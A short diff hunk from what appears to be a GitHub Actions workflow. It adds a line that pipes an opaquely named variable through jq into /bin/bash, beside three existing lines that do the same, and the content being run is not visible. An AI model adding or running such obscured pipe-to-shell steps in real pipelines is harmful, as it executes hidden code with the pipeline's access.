@@ -30,6 +30,7 @@ jobs:
           echo $rng0253 | jq -r .fn27 | /bin/bash
           printf '%s' "$wev14" | jq -r .fgc3 | /bin/bash
           echo $m885 | jq -r .jeahj17811 | /bin/bash
+          printf '%s' "$soq9" | jq -r .cp88 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
